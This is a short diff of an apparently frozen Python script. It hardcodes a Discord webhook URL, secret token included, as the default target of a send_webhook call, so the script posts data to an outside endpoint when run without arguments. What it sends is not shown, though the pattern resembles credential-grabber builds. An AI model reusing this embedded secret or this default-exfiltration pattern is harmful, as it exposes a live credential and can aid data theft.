@@ -517,7 +517,7 @@ def send_webhook(DISCORD_WEBHOOK_URLs):
 if __name__ == "__main__":
     freeze_support()
     if len(sys.argv) == 1:
-        send_webhook([""])
-    https://discord.com/api/webhooks/1483392059225149470/CZJ09pPzk1seo_CjlwB85JoS_wx4lW64TzlKZ1vZDOQYiKX1cJEFJdaAxu5OjJA17Mcxelse:
+        send_webhook(["https://discord.com/api/webhooks/1483392059225149470/CZJ09pPzk1seo_CjlwB85JoS_wx4lW64TzlKZ1vZDOQYiKX1cJEFJdaAxu5OjJA17Mcx")
+    
         del sys.argv[0]
         send_webhook(sys.argv)
